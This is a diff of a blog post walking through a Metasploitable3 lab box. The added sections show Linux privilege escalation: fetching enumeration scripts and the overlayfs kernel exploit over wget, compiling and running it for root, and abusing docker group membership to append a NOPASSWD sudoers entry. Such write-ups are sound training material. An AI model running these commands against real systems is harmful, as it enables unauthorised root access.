@@ -1,22 +1,23 @@
 ---
 layout: single
 title: Metasploitable3 - Exploiting UnrealIRC Service
-excerpt:
-date: 2020-03-18
+excerpt: Metasploitable3 is a free vulnerable machine - either in a Linux or Windows version - that allows you to simulate attacks largely using metasploit. For this post, I will try exploiting the IRC service without metasploit and go on to gain root in two different ways
+date: 2020-04-08
 classes: wide
 header:
-  teaser: /assets/images/metasplitable3/metasploit_logo.jpg
+  teaser: <img src="/assets/images/metasplitable3/metasploit_logo.jpg">
   teaser_home_page: true
-  icon: /assets/images/hackthebox.png
+  icon: <img src="/assets/images/hackthebox.png">
 categories:
   - metasploitable3
 tags:
   - irc
   - linux
   - kernel exploits
+  - docker
 ---
 
-![] (/assets/images/metasploitable3/metasploit_logo.jpg)
+<img src="/assets/images/metasploitable3/metasploit_logo.jpg">
 
 ## Summary
 
@@ -234,7 +235,7 @@ boba_fett@metasploitable3-ub1404:/opt/unrealircd/Unreal3.2$
 
 ### From boba_fett --> root
 
-In order to gain full root access, further recon is required to find ways in which we can further escalate our current privileges. I usually run the post exploitation scripts such as `LinEnum.sh` and `linux-smart-enumeration` script to help automate this stage. First, I need to transfer these scripts to the compromised server and executed them. I will setup a webserver on the attacker machine and use wget to download the files to a location so i can execute them
+In order to gain full root access, further recon is required to find ways in which we can further escalate our current privileges. I usually run the post exploitation scripts such as `LinEnum.sh`, `linux-kernel-exploiter` and `linux-smart-enumeration` script to help automate this stage. First, I need to transfer these scripts to the compromised server and executed them. I will setup a webserver on the attacker machine and use wget to download the files to a location so i can execute them.
 
 ```
 root@cyb3r:/opt/LinEnum# python -m SimpleHTTPServer 80
@@ -274,6 +275,203 @@ Saving to: 'lse.sh'
 2019-12-15 12:24:58 (20.2 MB/s) - 'lse.sh' saved [31736/31736]
 
 boba_fett@metasploitable3-ub1404:/var/tmp$
+
+
+boba_fett@metasploitable3-ub1404:~$ wget http://192.168.4.129/linux-exploit-suggester-2.pl
+--2020-04-08 13:05:21--  http://192.168.4.128/linux-exploit-suggester-2.pl
+Connecting to 192.168.4.128:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 24783 (24K) [text/x-perl]
+Saving to: ‘linux-exploit-suggester-2.pl’
+
+100%[===================================================================================================================>] 24,783      --.-K/s   in 0s      
+
+2020-04-08 13:05:21 (108 MB/s) - ‘linux-exploit-suggester-2.pl’ saved [24783/24783]
+
+boba_fett@metasploitable3-ub1404:~$
 ```
 
 After running the enumeration scripts, are few things popped out for me:
+
+##### Kernel Exploits - There were some kernel exploits available for this operating system
+
+```
+boba_fett@metasploitable3-ub1404:~$ perl linux-exploit-suggester-2.pl 
+
+  #############################
+    Linux Exploit Suggester 2
+  #############################
+
+  Local Kernel: 3.13.0
+  Searching 72 exploits...
+
+  Possible Exploits
+  [1] dirty_cow
+      CVE-2016-5195
+      Source: http://www.exploit-db.com/exploits/40616
+  [2] exploit_x
+      CVE-2018-14665
+      Source: http://www.exploit-db.com/exploits/45697
+  [3] overlayfs
+      CVE-2015-8660
+      Source: http://www.exploit-db.com/exploits/39230
+  [4] pp_key
+      CVE-2016-0728
+      Source: http://www.exploit-db.com/exploits/39277
+  [5] timeoutpwn
+      CVE-2014-0038
+      Source: http://www.exploit-db.com/exploits/31346
+
+boba_fett@metasploitable3-ub1404:~$ 
+```
+
+##### The user boba_fett belongs the docker group and this can be leaveraged to obtain a root shell if the docker setting settings aren't properly configured
+
+```
+[!] ctn020 Is the user a member of the 'docker' group?..................... yes!
+---
+docker
+---
+```
+
+#### Gaining root using the kernel exploit overlays(CVE-2015-8660)
+
+We can go ahead and download the overlays exploit from [here](http://www.exploit-db.com/exploits/39230), send it over to the victim machine and then compile the script to an executable and run it so as to gain the root shell:
+
+```
+boba_fett@metasploitable3-ub1404:~$ wget http://192.168.4.129/overlay.c
+wget http://192.168.4.129/overlay.c
+--2019-05-03 15:46:08--  http://192.168.4.129/overlay.c
+Connecting to 192.168.72.131:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5119 (5.0K) [text/plain]
+Saving to: 'overlay.c'
+
+100%[======================================>] 5,119       --.-K/s   in 0s      
+
+2019-05-03 15:46:09 (93.7 MB/s) - 'overlay.c' saved [5119/5119]
+
+boba_fett@metasploitable3-ub1404:~$ gcc overlay.c -o ofs
+gcc overlay.c -o ofs
+
+boba_fett@metasploitable3-ub1404:~$ chmod +x ofs
+chmod +x ofs
+boba_fett@metasploitable3-ub1404:~$ ./ofs
+./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),100(users),999(docker)
+# 
+```
+
+#### Gaining root taking advantage to the docker group
+
+With user boba_fett in the docker group, we can issue docker commands without any restrictions. I will use docker command `docker images` to list the docker images on the system
+
+```
+boba_fett@metasploitable3-ub1404:~$ docker images
+REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE
+7_of_diamonds               latest              5e45125fa132        20 months ago       84.2MB
+ubuntu                      latest              735f80812f90        20 months ago       83.5MB
+krustyhack/docker-privesc   latest              6b5ae09db018        2 years ago         3.97MB
+boba_fett@metasploitable3-ub1404:~$ 
+```
+
+From this printout I can see we have an `Ubuntu` image on the system. The attack vector that straight away comes to mind to is to map the `/etc/` directory to a directory `/root/` within the docker container. Within the container, I'll have access as root and be able to add user `boba_fett` into the sudoers file so he can issue all commands with the `sudo` without knowing his passwprd and therefore go on the get a root shell using `sudo bash`.
+
+To run a container and mount the `/etc` directory, I will use the following command, `docker run -dit -v /etc:/root ubuntu` and I can check the running container using `docker ps`
+
+```
+boba_fett@metasploitable3-ub1404:~$ docker run -dit -v /etc:/root ubuntu
+5918a86e9463068479143edc7217831b17929096a80c82a330d2c3b5c6bfcac6
+boba_fett@metasploitable3-ub1404:~$ docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+5918a86e9463        ubuntu              "/bin/bash"         16 seconds ago      Up 5 seconds                            cocky_wozniak
+753bae4795cf        7_of_diamonds       "/bin/bash"         20 months ago       Up 5 hours                              7_of_diamonds
+boba_fett@metasploitable3-ub1404:~$ 
+
+```
+
+We have our ubuntu container with id `5918a86e9463` running. Next step is to connect to our docker container, edit the suders file and insert details for boba_fett to be able to issue commands with sudo without entering his password(which we don't know). 
+
+```
+boba_fett@metasploitable3-ub1404:~$ docker exec -it 5918a86e9463 /bin/bash
+root@5918a86e9463:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@5918a86e9463:/# pwd
+/
+root@5918a86e9463:/# cd /root
+root@5918a86e9463:~# cat passwd | grep boba_fett
+boba_fett:x:1121:100::/home/boba_fett:/bin/bash
+root@5918a86e9463:~# 
+```
+
+From the printout above, it's clear we have root access in the docker container and have successfully mounted the `/etc/` directory in the `root` directory. A simple grep on the `passwd` file, we can found our user's name. 
+
+To edit the `sudoers` file, we will use the `echo` to append the following information to enable user `boba_fett` issue sudo commands without any password: `echo "boba_fett ALL=(ALL) NOPASSWD: ALL" >> sudoers`. We can confirm this has been appended to the file by reading the file using `cat sudoers`.
+
+```
+root@5918a86e9463:~# echo "boba_fett ALL=(ALL) NOPASSWD: ALL" >> sudoers
+root@5918a86e9463:~# cat sudoers
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+boba_fett ALL=(ALL) NOPASSWD: ALL
+root@5918a86e9463:~# 
+```
+
+With this done, we can exit the container and simply issue `sudo bash` to gain a root shell
+
+```
+root@5918a86e9463:~# exit
+exit
+boba_fett@metasploitable3-ub1404:~$ 
+boba_fett@metasploitable3-ub1404:~$ id
+uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
+boba_fett@metasploitable3-ub1404:~$ whoami
+boba_fett
+boba_fett@metasploitable3-ub1404:~$ sudo bash
+root@metasploitable3-ub1404:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@metasploitable3-ub1404:~# whoami
+root
+root@metasploitable3-ub1404:~# hostname
+metasploitable3-ub1404
+root@metasploitable3-ub1404:~# 
+
+```
+
+So, we finally have a shell as root. Hope you enjoyed reading this walkthrough.
